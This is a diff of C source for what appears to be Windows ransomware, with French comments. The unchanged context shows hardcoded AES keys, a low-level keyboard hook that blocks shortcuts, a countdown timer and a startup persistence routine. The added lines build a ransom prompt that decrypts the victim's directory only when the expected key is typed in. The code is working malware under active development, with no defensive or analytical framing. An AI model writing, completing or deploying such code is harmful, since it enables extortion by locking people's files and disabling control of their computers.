@@ -11,6 +11,10 @@ unsigned char iv[IV_SIZE] = "abcdef9876543210";                  // IV AES 128 b
 int encryption_done = 0;
 time_t end_time;
 HHOOK hKeyboardHook; // Hook global pour bloquer les raccourcis clavier
+HWND hInputBox = NULL; // Champ d'entrée
+HWND hSubmitButton = NULL; // Bouton "Valider"
+const char *expected_key = "0123456789abcdef0123456789abcdef"; // La clé de déchiffrement attendue
+
 
 // Prototypes
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -21,10 +25,6 @@ void add_to_startup(const char *exe_path);
 
 // Fonction principale
 int main() {
-
-    // Configure la console en UTF-8
-    //SetConsoleOutputCP(CP_UTF8);
-    //SetConsoleCP(CP_UTF8);
 
     // Initialise le hook clavier
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
@@ -125,9 +125,34 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             break;
         }
         case WM_COMMAND: {
-            if (LOWORD(wParam) == 1) {
+            /**if (LOWORD(wParam) == 1) {
                 perform_decryption(directory, key, iv);
                 PostQuitMessage(0);
+            }**/
+
+            if (LOWORD(wParam) == 1) { // Bouton "Déchiffrer" cliqué
+                // Ajoute un champ d'entrée et un bouton "Valider" s'ils n'existent pas encore
+                if (!hInputBox) {
+                    hInputBox = CreateWindow("EDIT", "",
+                        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
+                        450, 400, 250, 30, hwnd, (HMENU)2, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+
+                    hSubmitButton = CreateWindow("BUTTON", "Valider",
+                        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                        710, 400, 100, 30, hwnd, (HMENU)3, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+                }
+            } else if (LOWORD(wParam) == 3) { // Bouton "Valider" cliqué
+                char entered_key[256];
+                GetWindowText(hInputBox, entered_key, sizeof(entered_key)); // Récupérer la clé saisie
+
+                // Vérifier si la clé est correcte
+                if (strcmp(entered_key, expected_key) == 0) {
+                    perform_decryption(directory, key, iv);
+                    MessageBox(hwnd, "Fichiers déchiffrés avec succès !", "Succès", MB_OK | MB_ICONINFORMATION);
+                    PostQuitMessage(0); // Quitter le programme
+                } else {
+                    MessageBox(hwnd, "Clé incorrecte. Veuillez réessayer.", "Erreur", MB_OK | MB_ICONERROR);
+                }
             }
             break;
         }
